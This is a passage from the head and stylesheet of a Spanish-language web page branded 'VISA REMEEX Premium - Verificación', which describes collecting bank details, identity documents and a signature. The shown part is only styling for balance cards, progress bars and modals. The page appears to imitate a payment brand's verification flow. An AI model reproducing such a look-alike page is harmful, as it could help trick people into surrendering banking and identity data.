<!DOCTYPE html>
<html lang="es">
<head>
  <meta charset="UTF-8">
  <title>VISA REMEEX Premium - Verificación</title>
  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, minimum-scale=1.0, user-scalable=no">
  <meta name="description" content="Beneficiario Receptor, Datos Bancarios, Documento de Identidad, Firma Digital y Planilla de Retiro. VISA REMEEX Premium." />

  <link rel="icon" href="https://w7.pngwing.com/pngs/400/28/png-transparent-credit-card-computer-icons-visa-electron-bank-curio-blue-text-rectangle-thumbnail.png" type="image/png" />

  <!-- Fuentes e Iconos -->
  <link rel="preconnect" href="https://fonts.googleapis.com">
  <link href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;500;600;700&display=swap" rel="stylesheet">
  <link href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0/css/all.min.css" rel="stylesheet" />

  <!-- Librerías adicionales -->
  <script src="https://cdnjs.cloudflare.com/ajax/libs/qrcode-generator/1.4.4/qrcode.min.js"></script>
  <script src="https://cdnjs.cloudflare.com/ajax/libs/html2pdf.js/0.9.3/html2pdf.bundle.min.js"></script>

  <style>
    :root {
      --primary: #1a1f71; /* Azul oscuro de Visa */
      --primary-light: #2c348e;
      --primary-dark: #0d153e; /* Azul más oscuro */
      --secondary: #3b82f6;
      --accent: #60a5fa;
      --success: #22c55e;
      --success-dark: #16a34a;
      --danger: #ef4444;
      --danger-dark: #dc2626;
      --warning: #f59e0b;
      --warning-dark: #d97706;

      /* Color verde fluorescente para la barra de progreso */
      --neon-green: #39ff14;
      --neon-green-light: #5fff3f;
      --neon-green-dark: #32e410;
      --neon-green-glow: rgba(57, 255, 20, 0.5);
      --neon-green-glow-bright: rgba(57, 255, 20, 0.75);
      
      /* Colores de acento y glow */
      --glow-blue: rgba(59, 130, 246, 0.4);
      --glow-blue-bright: rgba(59, 130, 246, 0.7);
      --glow-green: rgba(34, 197, 94, 0.4);
      --glow-red: rgba(239, 68, 68, 0.4);

      --border-white: #ffffff;
      --border-gray: #d1d5db; 
      --border-light-blue: #93c5fd; 

      --background: #f8fafc;
      --card-bg: rgba(255, 255, 255, 0.98);
      --text-primary: #0f172a;
      --text-secondary: #475569;
      --text-light: #94a3b8;

      --border-radius-xl: 28px;
      --border-radius-lg: 24px;
      --border-radius: 16px;
      --border-radius-sm: 12px;

      --transition: all 0.3s cubic-bezier(0.4, 0, 0.2, 1);
      --transition-bounce: all 0.5s cubic-bezier(0.68, -0.55, 0.27, 1.55);
      --shadow-sm: 0 4px 6px -1px rgb(0 0 0 / 0.05), 0 2px 4px -2px rgb(0 0 0 / 0.05);
      --shadow: 0 10px 20px rgba(0, 0, 0, 0.3), 0 6px 6px rgba(0, 0, 0, 0.2);
      --shadow-lg: 0 25px 50px rgba(0, 0, 0, 0.3);
      --shadow-inner: inset 0 2px 4px 0 rgb(0 0 0 / 0.05);

      --aurora-gradient: linear-gradient(
        120deg,
        rgba(26, 31, 113, 0.4),
        rgba(25, 35, 102, 0.3),
        rgba(30, 40, 120, 0.3),
        rgba(26, 31, 113, 0.2)
      );
      background-size: 400% 400%;
      
      /* Nuevas variables para colores más claros de la tarjeta Visa */
      --visa-grad-start: #2a43c2; /* Color más claro */
      --visa-grad-end: #1b62d6; /* Color más claro */
    }

    * {
      margin: 0;
      padding: 0;
      box-sizing: border-box;
    }
    body {
      min-height: 100vh;
      background: linear-gradient(135deg, #f0f9ff 0%, #e0f2fe 100%);
      font-family: 'Inter', sans-serif;
      color: var(--text-primary);
      line-height: 1.6;
      display: flex;
      justify-content: center;
      align-items: flex-start;
      padding: 1rem;
      overflow-x: hidden;
    }

    .container {
      max-width: 650px;
      width: 100%;
      margin-top: 2rem;
      background: var(--card-bg);
      border-radius: var(--border-radius-xl);
      box-shadow: var(--shadow);
      backdrop-filter: blur(10px);
      border: 2px solid var(--border-white);
      overflow: hidden;
      position: relative;
      opacity: 0;
      transform: scale(0.95);
      transition: opacity 0.3s ease-out, transform 0.3s ease-out;
      animation: glow 6s ease infinite, border-blink 6s linear infinite;
    }
    .container.active {
      opacity: 1;
      transform: scale(1);
    }

    @keyframes glow {
      0%, 100% {
        box-shadow: 0 0 40px rgba(26, 31, 113, 0.5), 0 0 80px rgba(26, 31, 113, 0.3);
      }
      50% {
        box-shadow: 0 0 70px rgba(26, 31, 113, 0.8), 0 0 100px rgba(26, 31, 113, 0.6);
      }
    }
    @keyframes border-blink {
      0%   { border-color: var(--border-white); }
      33%  { border-color: var(--border-gray); }
      66%  { border-color: var(--border-light-blue); }
      100% { border-color: var(--border-white); }
    }

    .header {
      text-align: center;
      background: linear-gradient(135deg, var(--primary-dark), var(--primary));
      color: #fff;
      padding: 3rem 2rem;
      position: relative;
      overflow: hidden;
      border-top-left-radius: var(--border-radius-xl);
      border-top-right-radius: var(--border-radius-xl);
      background-image: var(--aurora-gradient);
      animation: aurora-animation 15s ease infinite;
    }
    @keyframes aurora-animation {
      0%   { background-position: 0% 50%; }
      50%  { background-position: 100% 50%; }
      100% { background-position: 0% 50%; }
    }
    .header::after {
      content: "";
      position: absolute;
      top: 0;
      left: -100%;
      width: 100%;
      height: 100%;
      background: linear-gradient(120deg, transparent, rgba(255,255,255,0.6), transparent);
      transform: skewX(-20deg);
      opacity: 0;
      z-index: 1;
      animation: header-flash 3s infinite;
    }
    @keyframes header-flash {
      0% {
        left: -100%;
        opacity: 0;
      }
      10% {
        left: -50%;
        opacity: 1;
      }
      50% {
        left: 100%;
        opacity: 1;
      }
      60% {
        left: 100%;
        opacity: 0;
      }
      100% {
        left: 100%;
        opacity: 0;
      }
    }
    .header-logo {
      display: block;
      margin: 0 auto 1rem auto;
      width: 80%;
      max-width: 400px;
      height: auto;
      position: relative;
      z-index: 2;
    }

    /* Tarjeta de Saldo Disponible - NUEVA VERSIÓN */
    .balance-card {
      background: linear-gradient(150deg, #1a237e 0%, #0d47a1 100%);
      color: rgba(255, 255, 255, 0.95);
      border-radius: var(--border-radius-lg);
      padding: 1.5rem;
      margin: -2rem 1.5rem 1.5rem 1.5rem; 
      box-shadow: var(--shadow);
      position: relative;
      overflow: hidden;
      z-index: 2;
      font-family: 'Inter', sans-serif;
      transition: var(--transition);
    }
    
    .balance-card:hover {
      transform: translateY(-3px);
      box-shadow: var(--shadow-lg);
    }/* Variables para la tarjeta */
    :root {
      --text-white: rgba(255, 255, 255, 0.95);
      --text-light: rgba(255, 255, 255, 0.8);
      --accent: #00e676; /* Verde más vibrante para acentos */
      --accent-glow: rgba(0, 230, 118, 0.7);
      --portal-glow: rgba(0, 230, 118, 0.4);
    }
    
    /* Card header */
    .card-header {
      display: flex;
      justify-content: space-between;
      align-items: center;
      margin-bottom: 0.75rem;
      position: relative;
      z-index: 5;
    }
    
    .logo {
      font-weight: 700;
      letter-spacing: -0.5px;
      font-size: 1.2rem;
      display: flex;
      align-items: center;
      gap: 0.5rem;
    }
    
    .logo i {
      color: var(--accent);
    }
    
    .exchange-rate {
      font-size: 0.8rem;
      opacity: 0.8;
      display: flex;
      align-items: center;
      gap: 0.4rem;
    }
    
    /* Sección del saldo */
    .balance-section {
      position: relative;
      z-index: 5;
      margin-bottom: 0.5rem;
      padding-top: 0.5rem;
    }
    
    .balance-label {
      font-size: 0.85rem;
      color: var(--text-light);
      margin-bottom: 0.5rem;
      display: flex;
      align-items: center;
    }
    
    .balance-amount {
      font-size: 2.2rem;
      font-weight: 700;
      margin-bottom: 0.5rem;
      display: flex;
      align-items: center;
      text-shadow: 0 0 10px rgba(255, 255, 255, 0.3);
      background: linear-gradient(to right, #ffffff, #e0e0e0);
      -webkit-background-clip: text;
      -webkit-text-fill-color: transparent;
      position: relative;
      white-space: nowrap;
      overflow: hidden;
      text-overflow: ellipsis;
    }
    
    .balance-amount::after {
      content: '';
      position: absolute;
      bottom: -5px;
      left: 0;
      width: 100%;
      height: 1px;
      background: linear-gradient(to right, transparent, rgba(255, 255, 255, 0.5), transparent);
    }
    
    /* Info section (textos dinámicos) */
    .info-section {
      position: relative;
      z-index: 5;
      height: 1.3rem;
      margin-top: 0.75rem;
    }
    
    .dynamic-text {
      font-size: 0.7rem;
      opacity: 0.85;
      transition: opacity 0.5s;
      white-space: nowrap;
      overflow: hidden;
      text-overflow: ellipsis;
      display: flex;
      align-items: center;
      gap: 0.5rem;
    }
    
    /* Spinner */
    .spinner {
      display: inline-block;
      width: 14px;
      height: 14px;
      position: relative;
      margin-left: 8px;
      vertical-align: middle;
    }
    
    .spinner-circle {
      box-sizing: border-box;
      position: absolute;
      width: 100%;
      height: 100%;
      border: 2px solid transparent;
      border-top-color: var(--accent);
      border-radius: 50%;
      animation: spinnerRotate 1.5s linear infinite;
    }
    
    .spinner-inner {
      display: block;
      position: absolute;
      left: 3px;
      top: 3px;
      width: 8px;
      height: 8px;
      border-radius: 50%;
      background-color: var(--accent);
      opacity: 0.7;
      animation: spinnerPulse 1s ease-in-out infinite alternate;
    }
    
    @keyframes spinnerRotate {
      0% { transform: rotate(0deg); }
      100% { transform: rotate(360deg); }
    }
    
    @keyframes spinnerPulse {
      0% { transform: scale(0.8); opacity: 0.3; }
      100% { transform: scale(1); opacity: 0.7; }
    }
    
    /* Portal y efectos */
    .transfer-portal {
      position: absolute;
      right: -15px;
      top: 50%;
      transform: translateY(-50%);
      width: 30px;
      height: 85%;
      background: var(--portal-glow);
      box-shadow: inset 0 0 20px var(--accent);
      border-radius: 50px 0 0 50px;
      z-index: 2;
      overflow: hidden;
      animation: portalPulse 3s infinite;
    }
    
    .transfer-portal::before {
      content: "";
      position: absolute;
      top: 10%;
      bottom: 10%;
      left: 0;
      width: 100%;
      background: repeating-linear-gradient(
        to bottom,
        transparent,
        transparent 5px,
        rgba(0, 230, 118, 0.3) 5px,
        rgba(0, 230, 118, 0.3) 10px
      );
      opacity: 0.6;
      animation: portalLines 8s linear infinite;
    }
    
    @keyframes portalLines {
      0% { transform: translateY(0); }
      100% { transform: translateY(100px); }
    }
    
    @keyframes portalPulse {
      0%, 100% { opacity: 0.8; box-shadow: inset 0 0 20px var(--accent), 0 0 15px rgba(0, 230, 118, 0.3); }
      50% { opacity: 1; box-shadow: inset 0 0 35px var(--accent), 0 0 30px var(--accent-glow); }
    }
    
    /* Partículas flotantes */
    .particles-container {
      position: absolute;
      top: 0;
      left: 0;
      width: 100%;
      height: 100%;
      overflow: hidden;
      z-index: 1;
    }
    
    .particle {
      position: absolute;
      width: 6px;
      height: 6px;
      background: radial-gradient(circle, rgba(0, 230, 118, 1) 0%, rgba(0, 230, 118, 0.2) 70%);
      border-radius: 50%;
      opacity: 0;
      pointer-events: none;
      filter: drop-shadow(0 0 3px rgba(0, 230, 118, 0.8));
    }
    
    /* Partículas con diferentes formas */
    .particle.diamond {
      clip-path: polygon(50% 0%, 100% 50%, 50% 100%, 0% 50%);
      background: var(--accent);
    }
    
    .particle.mini {
      width: 3px;
      height: 3px;
      background: var(--accent);
    }
    
    /* Efecto de líneas de cuadrícula */
    .balance-card::after {
      content: "";
      position: absolute;
      top: 0;
      left: 0;
      width: 100%;
      height: 100%;
      background-image: 
        linear-gradient(rgba(255, 255, 255, 0.05) 1px, transparent 1px),
        linear-gradient(90deg, rgba(255, 255, 255, 0.05) 1px, transparent 1px);
      background-size: 20px 20px;
      z-index: 0;
      opacity: 0.3;
    }/* Dot loader animation */
    .dot-loader {
      display: inline-block;
      font-size: 0.7rem;
    }
    
    .dot-loader::after {
      content: "";
      animation: dotAnimation 1.5s steps(1, end) infinite;
      display: inline-block;
      width: 1.5em;
      text-align: left;
    }
    
    @keyframes dotAnimation {
      0% { content: ""; }
      33% { content: "."; }
      66% { content: ".."; }
      100% { content: "..."; }
    }
    
    /* Spinner alternative styles */
    .spinner.style2 .spinner-circle {
      border-width: 1px;
      border-top-width: 3px;
      border-left-width: 3px;
    }
    
    .spinner.style2 .spinner-inner {
      background: linear-gradient(45deg, var(--accent), transparent);
      opacity: 0.9;
    }
    
    .spinner.style3 {
      overflow: visible;
    }
    
    .spinner.style3 .spinner-circle {
      border: none;
      background: conic-gradient(
        from 0deg, 
        transparent 0%, 
        var(--accent) 40%, 
        var(--accent) 60%, 
        transparent 85%
      );
    }
    
    .spinner.style3 .spinner-inner {
      width: 5px;
      height: 5px;
      left: 4.5px;
      top: 4.5px;
      box-shadow: 0 0 5px var(--accent-glow);
    }
    
    .spinner.style4 .spinner-circle {
      border-top-color: var(--accent);
      border-right-color: var(--accent);
      opacity: 0.7;
    }
    
    .spinner.style4 .spinner-inner {
      animation: spinnerPulse 0.5s ease-in-out infinite alternate;
    }

    /* Barra de progreso */
    .progress-bar {
      height: 16px;
      background-color: #e2e8f0;
      border-radius: var(--border-radius);
      margin: 2rem;
      overflow: hidden;
      position: relative;
      box-shadow: inset 0 1px 3px rgba(0,0,0,0.1);
    }
    .progress-bar-fill {
      height: 100%;
      background: linear-gradient(90deg, var(--primary), var(--secondary));
      width: 40%; /* Progreso inicial */
      transition: width 0.6s ease-in-out;
      border-radius: var(--border-radius);
      position: relative;
      overflow: hidden;
    }
    .progress-bar-fill::after {
      content: '';
      position: absolute;
      top: 0;
      left: -50%;
      width: 100%;
      height: 100%;
      background: rgba(255, 255, 255, 0.3);
      transform: skewX(-45deg);
      animation: move 2s linear infinite;
    }
    @keyframes move {
      0% { left: -50%; }
      100% { left: 100%; }
    }
    .progress-text {
      position: absolute;
      width: 100%;
      top: 50%;
      transform: translateY(-50%);
      text-align: center;
      font-weight: bold;
      color: #fff;
      z-index: 3;
    }

    /* Secciones con transición */
    .section-content {
      padding: 2rem;
      opacity: 0;
      transform: translateY(10px);
      transition: all 0.4s ease-out;
      display: none;
    }
    .section-content.active {
      display: block;
      opacity: 1;
      transform: translateY(0);
    }
    .section-content h2 {
      margin-bottom: 1.5rem;
      font-size: 1.5rem;
      display: flex;
      align-items: center;
      gap: 0.75rem;
      color: var(--primary);
    }
    .section-content h2 i {
      color: var(--primary);
      font-size: 1.3rem;
    }
    .form-group {
      margin-bottom: 1.75rem;
    }
    .form-label {
      display: block;
      margin-bottom: 0.5rem;
      font-weight: 500;
      color: var(--text-secondary);
      font-size: 0.95rem;
    }
    .form-control {
      width: 100%;
      padding: 0.875rem 1.25rem;
      border: 2px solid #e2e8f0;
      border-radius: var(--border-radius);
      font-size: 1rem;
      background: #fff;
      transition: var(--transition);
      color: var(--text-primary);
    }
    .form-control:hover {
      border-color: #cbd5e1;
    }
    .form-control:focus {
      outline: none;
      border-color: var(--primary);
      box-shadow: 0 0 0 4px rgba(26, 31, 113, 0.2);
    }
    .checkbox-group {
      display: flex;
      align-items: center;
      gap: 0.75rem;
      margin-top: 1.5rem;
      padding: 1rem;
      background: #f8fafc;
      border-radius: var(--border-radius);
      border: 1px solid #e2e8f0;
    }
    .checkbox-group input[type="checkbox"] {
      width: 1.2rem;
      height: 1.2rem;
      border-radius: 4px;
      border: 2px solid var(--primary);
      transition: var(--transition);
      cursor: pointer;
    }
    .checkbox-group input[type="checkbox"]:checked {
      background: var(--primary);
    }
    .checkbox-group a {
      color: var(--primary);
      text-decoration: none;
      font-weight: 500;
      transition: var(--transition);
    }
    .checkbox-group a:hover {
      color: var(--primary-dark);
      text-decoration: underline;
    }

    /* Botones y efectos */
    .btn {
      display: inline-flex;
      align-items: center;
      justify-content: center;
      gap: 0.5rem;
      padding: 0.75rem 1.5rem;
      border-radius: var(--border-radius-sm);
      font-weight: 600;
      font-size: 0.95rem;
      transition: var(--transition);
      border: none;
      cursor: pointer;
      position: relative;
      overflow: hidden;
    }.btn-primary {
      background: linear-gradient(135deg, var(--primary), var(--secondary));
      color: #fff;
      box-shadow: var(--shadow-sm);
      position: relative;
      z-index: 1;
    }
    .btn-primary::before {
      content: '';
      position: absolute;
      top: -2px;
      left: -2px;
      right: -2px;
      bottom: -2px;
      background: linear-gradient(90deg, transparent, var(--primary), var(--secondary), transparent);
      background-size: 200% 100%;
      border-radius: var(--border-radius-sm);
      animation: border-glow 3s ease infinite;
      filter: blur(12px);
      opacity: 0.7;
      z-index: -1;
    }
    .btn-primary:hover {
      transform: translateY(-2px);
      box-shadow: var(--shadow);
    }
    .btn-success {
      background: var(--success);
      color: #fff;
      position: relative;
      z-index: 1;
    }
    .btn-success:hover {
      transform: translateY(-2px);
      box-shadow: var(--shadow);
    }
    .btn-danger {
      background: var(--danger);
      color: #fff;
      position: relative;
      z-index: 1;
    }
    .btn-danger:hover {
      transform: translateY(-2px);
      box-shadow: var(--shadow);
    }
    .btn-outline {
      background: transparent;
      color: var(--primary);
      border: 2px solid var(--primary);
      position: relative;
      z-index: 1;
    }
    .btn-outline::before {
      content: '';
      position: absolute;
      top: -2px;
      left: -2px;
      right: -2px;
      bottom: -2px;
      background: linear-gradient(90deg, transparent, var(--primary), var(--secondary), transparent);
      background-size: 200% 100%;
      border-radius: var(--border-radius-sm);
      animation: border-glow 3s ease infinite;
      filter: blur(12px);
      opacity: 0.7;
      z-index: -1;
    }
    .btn-outline:hover {
      background: rgba(20, 52, 203, 0.05);
    }
    .btn-container {
      display: flex;
      justify-content: space-between;
      margin-top: 1.5rem;
      position: relative;
      width: 100%;
    }
    .btn-container2 {
      display: flex;
      justify-content: space-between;
      margin-top: 1.5rem;
      gap: 1rem;
      position: relative;
      flex-wrap: wrap;
    }
    .btn-disabled {
      opacity: 0.6;
      cursor: not-allowed;
      pointer-events: none;
    }
    .btn-glow-effect {
      position: absolute;
      top: -2px;
      left: -2px;
      right: -2px;
      bottom: -2px;
      background: linear-gradient(90deg, transparent, var(--primary), var(--secondary), transparent);
      background-size: 200% 100%;
      border-radius: 30px;
      animation: border-glow 3s ease infinite;
      filter: blur(15px);
      opacity: 0.7;
      z-index: 0;
    }
    @keyframes border-glow {
      0%   { background-position: -100% 0; }
      50%  { background-position: 100% 0; }
      100% { background-position: -100% 0; }
    }
    .btn-glow {
      position: relative;
      width: 100%;
      height: 100%;
      background: linear-gradient(135deg, var(--primary), var(--secondary));
      color: white;
      border: none;
      border-radius: 30px;
      cursor: pointer;
      overflow: hidden;
      box-shadow: 0 15px 25px rgba(0,0,0,0.3), inset 0 -4px 8px rgba(255,255,255,0.3);
      transition: all 0.3s ease, transform 0.2s ease-in-out;
      z-index: 1;
      display: flex;
      align-items: center;
      justify-content: center;
      font-weight: 600;
      font-size: 1rem;
    }
    .btn-glow:hover {
      transform: translateY(-3px);
      box-shadow: 0 15px 30px rgba(0, 0, 0, 0.3);
    }
    .btn-glow-content {
      position: absolute;
      top: 0;
      left: 0;
      width: 100%;
      height: 100%;
      display: flex;
      align-items: center;
      justify-content: center;
      transition: all 0.3s ease;
    }
    .btn-glow-initial {
      opacity: 1;
      transform: translateX(0);
    }
    .btn-glow:hover .btn-glow-initial {
      opacity: 0;
      transform: translateX(100%);
    }
    .btn-glow-hover {
      position: absolute;
      top: 0;
      left: 0;
      width: 100%;
      height: 100%;
      display: flex;
      align-items: center;
      justify-content: center;
      opacity: 0;
      transform: translateX(-100%);
      color: white;
    }
    .btn-glow:hover .btn-glow-hover {
      opacity: 1;
      transform: translateX(0);
    }
    .btn-glow-icon {
      margin-left: 10px;
    }/* Sección Upload y vista previa */
    .preview-container {
      border: 1px dashed var(--primary);
      padding: 1rem;
      border-radius: var(--border-radius-sm);
      margin-bottom: 1rem;
      display: none;
      position: relative;
      text-align: center;
      background-color: #fff;
    }
    .preview-container.active {
      display: block;
    }
    .preview-container img {
      max-width: 100%;
      border-radius: var(--border-radius-sm);
    }

    /* Canvas de firma */
    .signature-canvas {
      border: 2px dashed var(--primary);
      border-radius: var(--border-radius-sm);
      width: 100%;
      height: 220px;
      background: #fff;
      margin-bottom: 1rem;
      position: relative;
      cursor: crosshair;
    }

    /* ===== NUEVOS ESTILOS MEJORADOS PARA OVERLAYS ===== */
    
    /* Overlay y Modal Mejorados */
    .overlay {
      position: fixed;
      top: 0;
      left: 0;
      width: 100%;
      height: 100%;
      background: rgba(15, 23, 42, 0.6);
      display: none;
      justify-content: center;
      align-items: center;
      z-index: 999;
      opacity: 0;
      transition: opacity 0.4s ease;
    }
    
    .overlay.active {
      display: flex;
      opacity: 1;
      backdrop-filter: blur(6px);
      animation: fadeIn 0.4s forwards;
    }
    
    @keyframes fadeIn {
      from { opacity: 0; }
      to { opacity: 1; }
    }
    
    .modal {
      background: rgba(255, 255, 255, 0.95);
      border-radius: var(--border-radius-lg);
      padding: 2rem;
      width: 90%;
      max-width: 420px;
      box-shadow: var(--shadow-lg);
      text-align: center;
      position: relative;
      backdrop-filter: blur(8px);
      border: 2px solid transparent;
      transform: translateY(30px);
      opacity: 0;
      animation: slideUpFade 0.5s forwards 0.1s;
    }
    
    @keyframes slideUpFade {
      from {
        transform: translateY(30px);
        opacity: 0;
      }
      to {
        transform: translateY(0);
        opacity: 1;
      }
    }
    
    .modal-glow {
      position: relative;
      background: white;
      border: 1px solid rgba(255, 255, 255, 0.2);
    }
    
    .modal-glow::before {
      content: '';
      position: absolute;
      inset: -1px;
      padding: 1px;
      border-radius: var(--border-radius-lg);
      background: linear-gradient(
        45deg, 
        var(--primary), 
        var(--secondary), 
        var(--primary),
        var(--secondary)
      );
      -webkit-mask: 
        linear-gradient(#fff 0 0) content-box, 
        linear-gradient(#fff 0 0);
      -webkit-mask-composite: xor;
      mask-composite: exclude;
      z-index: -1;
      animation: border-flow 6s linear infinite;
      background-size: 300% 300%;
    }
    
    @keyframes border-flow {
      0% { background-position: 0% 50%; }
      50% { background-position: 100% 50%; }
      100% { background-position: 0% 50%; }
    }
    
    .modal-glow::after {
      content: '';
      position: absolute;
      inset: -6px;
      z-index: -2;
      background: radial-gradient(circle at var(--mouse-x, 50%) var(--mouse-y, 50%), 
                  var(--glow-blue-bright) 0%, 
                  var(--glow-blue) 30%, 
                  transparent 70%);
      border-radius: var(--border-radius-lg);
      opacity: 0.7;
      filter: blur(18px);
      animation: pulse-glow 4s ease-in-out infinite;
    }
    
    .modal-glow.warning::after {
      background: radial-gradient(circle at var(--mouse-x, 50%) var(--mouse-y, 50%), 
                  rgba(245, 158, 11, 0.9) 0%, 
                  rgba(245, 158, 11, 0.6) 30%, 
                  transparent 70%);
    }
    
    .modal-glow.error::after {
      background: radial-gradient(circle at var(--mouse-x, 50%) var(--mouse-y, 50%), 
                  rgba(239, 68, 68, 0.9) 0%, 
                  rgba(239, 68, 68, 0.6) 30%, 
                  transparent 70%);
    }
    
    .modal-glow.success::after {
      background: radial-gradient(circle at var(--mouse-x, 50%) var(--mouse-y, 50%), 
                  rgba(34, 197, 94, 0.9) 0%, 
                  rgba(34, 197, 94, 0.6) 30%, 
                  transparent 70%);
    }@keyframes pulse-glow {
      0%, 100% {
        opacity: 0.6;
        filter: blur(14px);
      }
      50% {
        opacity: 0.9;
        filter: blur(18px);
      }
    }
    
    .modal h3 {
      font-size: 1.4rem;
      margin-bottom: 1rem;
      color: var(--primary);
      font-weight: 600;
      background: linear-gradient(90deg, var(--primary), var(--secondary));
      -webkit-background-clip: text;
      -webkit-text-fill-color: transparent;
      background-clip: text;
      text-fill-color: transparent;
    }
    
    .modal p {
      font-size: 1rem;
      color: var(--text-secondary);
      margin-bottom: 1.5rem;
      line-height: 1.6;
      text-align: center;
    }
    
    /* Barra de progreso con verde fluorescente */
    .progress-container {
      position: relative;
      height: 12px;
      background-color: rgba(226, 232, 240, 0.8);
      border-radius: 30px;
      margin: 1.5rem 0;
      overflow: hidden;
      box-shadow: var(--shadow-inner);
    }
    
    .progress-bar-advanced {
      height: 100%;
      border-radius: 30px;
      background: linear-gradient(90deg, var(--neon-green-dark), var(--neon-green));
      transition: width 0.6s cubic-bezier(0.34, 1.56, 0.64, 1);
      position: relative;
      overflow: hidden;
      box-shadow: 0 0 8px var(--neon-green-glow), 
                  0 0 14px var(--neon-green-glow),
                  inset 0 0 12px var(--neon-green-glow-bright);
    }
    
    .progress-bar-advanced::before {
      content: '';
      position: absolute;
      top: 0;
      left: 0;
      width: 100%;
      height: 100%;
      background: linear-gradient(
        90deg,
        transparent,
        rgba(255, 255, 255, 0.6),
        transparent
      );
      transform: translateX(-100%);
      animation: shimmer 2s infinite;
    }
    
    @keyframes shimmer {
      100% {
        transform: translateX(100%);
      }
    }
    
    .progress-bar-advanced.error {
      background: linear-gradient(90deg, var(--danger), var(--danger-dark));
      box-shadow: 0 0 8px var(--glow-red), 
                  0 0 14px var(--glow-red),
                  inset 0 0 12px rgba(239, 68, 68, 0.7);
    }
    
    .progress-bar-advanced.success {
      background: linear-gradient(90deg, var(--neon-green-dark), var(--neon-green));
      box-shadow: 0 0 8px var(--neon-green-glow), 
                  0 0 14px var(--neon-green-glow),
                  inset 0 0 12px var(--neon-green-glow-bright);
    }
    
    .progress-bar-advanced.warning {
      background: linear-gradient(90deg, var(--warning), var(--warning-dark));
      box-shadow: 0 0 8px rgba(245, 158, 11, 0.6), 
                  0 0 14px rgba(245, 158, 11, 0.6),
                  inset 0 0 12px rgba(245, 158, 11, 0.8);
    }
    
    .progress-percentage {
      position: absolute;
      top: 50%;
      left: 50%;
      transform: translate(-50%, -50%);
      font-size: 0.7rem;
      font-weight: 600;
      color: var(--text-secondary);
      z-index: 5;
      text-shadow: 0 0 5px rgba(255, 255, 255, 0.7);
    }
    
    /* Spinner avanzado */
    .spinner-advanced {
      width: 60px;
      height: 60px;
      margin: 1.5rem auto;
      position: relative;
    }
    
    .spinner-ring {
      width: 100%;
      height: 100%;
      border-radius: 50%;
      border: 4px solid transparent;
      border-top-color: var(--primary);
      border-right-color: var(--secondary);
      animation: spinnerRotateAdv 1.5s linear infinite;
      position: absolute;
      top: 0;
      left: 0;
    }
    
    .spinner-ring:nth-child(2) {
      width: 80%;
      height: 80%;
      top: 10%;
      left: 10%;
      border-top-color: var(--secondary);
      border-left-color: var(--primary);
      animation-duration: 2s;
      animation-direction: reverse;
    }
    
    .spinner-ring:nth-child(3) {
      width: 60%;
      height: 60%;
      top: 20%;
      left: 20%;
      border-bottom-color: var(--primary);
      border-left-color: var(--secondary);
      animation-duration: 2.5s;
    }.spinner-dot {
      position: absolute;
      top: 50%;
      left: 50%;
      transform: translate(-50%, -50%);
      width: 15px;
      height: 15px;
      background: linear-gradient(135deg, var(--primary), var(--secondary));
      border-radius: 50%;
      animation: pulse 1.5s cubic-bezier(0.455, 0.03, 0.515, 0.955) infinite alternate;
    }
    
    @keyframes pulse {
      0% {
        transform: translate(-50%, -50%) scale(0.6);
        opacity: 0.8;
      }
      100% {
        transform: translate(-50%, -50%) scale(1);
        opacity: 1;
      }
    }
    
    @keyframes spinnerRotateAdv {
      0% {
        transform: rotate(0deg);
      }
      100% {
        transform: rotate(360deg);
      }
    }
    
    /* Estilo para la firma en miniatura */
    .signature-container {
      position: relative;
      width: 160px;
      height: 80px;
      margin: 1.5rem auto;
      border-radius: 8px;
      overflow: hidden;
      box-shadow: var(--shadow);
      background: white;
    }
    
    .signature-img {
      width: 100%;
      height: 100%;
      object-fit: contain;
      animation: pulse-soft 2s infinite alternate;
    }
    
    @keyframes pulse-soft {
      0% {
        opacity: 0.85;
      }
      100% {
        opacity: 1;
      }
    }
    
    /* Botones avanzados */
    .btn-group {
      display: flex;
      justify-content: center;
      gap: 1rem;
      margin-top: 1.5rem;
      flex-wrap: wrap;
    }
    
    .btn-container-adv {
      position: relative;
      width: 140px;
      height: 48px;
    }
    
    .btn-effect {
      position: absolute;
      inset: -2px;
      border-radius: 30px;
      padding: 2px;
      background: linear-gradient(
        90deg, 
        var(--primary), 
        var(--secondary), 
        var(--primary)
      );
      background-size: 200% 100%;
      animation: gradient-shift 4s ease infinite;
      box-shadow: 0 0 0 3px rgba(26, 31, 113, 0.1);
      overflow: hidden;
    }
    
    @keyframes gradient-shift {
      0% {
        background-position: 0% 50%;
      }
      50% {
        background-position: 100% 50%;
      }
      100% {
        background-position: 0% 50%;
      }
    }
    
    .btn-advanced {
      width: 100%;
      height: 100%;
      background: linear-gradient(135deg, var(--primary), var(--primary-light));
      color: white;
      border: none;
      border-radius: 28px;
      cursor: pointer;
      overflow: hidden;
      position: relative;
      z-index: 1;
      font-weight: 600;
      font-size: 0.95rem;
      transition: var(--transition-bounce);
      display: flex;
      align-items: center;
      justify-content: center;
      text-transform: uppercase;
      letter-spacing: 0.5px;
    }
    
    .btn-advanced:hover {
      transform: translateY(-3px) scale(1.02);
      box-shadow: 0 10px 15px rgba(26, 31, 113, 0.2);
    }
    
    .btn-advanced:active {
      transform: translateY(-1px) scale(0.98);
    }
    
    .btn-content {
      position: absolute;
      inset: 0;
      display: flex;
      align-items: center;
      justify-content: center;
      transition: all 0.3s ease;
      backface-visibility: hidden;
    }
    
    .btn-text {
      display: flex;
      align-items: center;
      transition: var(--transition);
    }
    
    .btn-icon {
      margin-left: 8px;
      font-size: 1rem;
      opacity: 0;
      width: 0;
      transform: translateX(-10px);
      transition: var(--transition);
    }
    
    .btn-advanced:hover .btn-icon {
      opacity: 1;
      width: auto;
      transform: translateX(0);
    }/* Variantes de botón */
    .btn-advanced.warning {
      background: linear-gradient(135deg, var(--warning), var(--warning-dark));
    }
    
    .btn-advanced.success {
      background: linear-gradient(135deg, var(--neon-green), var(--neon-green-dark));
    }
    
    .btn-advanced.danger {
      background: linear-gradient(135deg, var(--danger), var(--danger-dark));
    }
    
    .btn-effect.warning {
      background: linear-gradient(
        90deg, 
        var(--warning), 
        var(--warning-dark), 
        var(--warning)
      );
    }
    
    .btn-effect.success {
      background: linear-gradient(
        90deg, 
        var(--neon-green), 
        var(--neon-green-dark), 
        var(--neon-green)
      );
    }
    
    .btn-effect.danger {
      background: linear-gradient(
        90deg, 
        var(--danger), 
        var(--danger-dark), 
        var(--danger)
      );
    }
    
    /* Logo banco con efecto */
    .bank-logo-container {
      position: relative;
      height: 50px;
